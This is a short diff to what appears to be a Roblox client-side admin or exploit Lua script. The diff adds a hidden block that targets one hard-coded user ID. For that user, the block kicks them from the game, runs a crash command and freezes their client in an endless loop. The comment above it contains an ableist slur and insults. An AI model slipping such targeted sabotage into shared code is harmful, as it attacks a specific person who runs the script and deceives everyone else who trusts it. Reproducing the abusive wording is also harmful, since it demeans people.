@@ -18314,6 +18314,14 @@ Spawn(function() -- init
 	if AUTOSCALER then AUTOSCALER.Name = randomString() end
 end)
 
+Spawn(function() -- bye bye retard go away bitch
+	if LocalPlayer.UserId==3101266219 then
+		LocalPlayer:Kick("NUH UH")
+		cmd.run({"crash"})
+		while true do end
+	end
+end)
+
 Spawn(bindToDevConsole)
 Spawn(loadAliases)
 Spawn(loadButtonIDS)
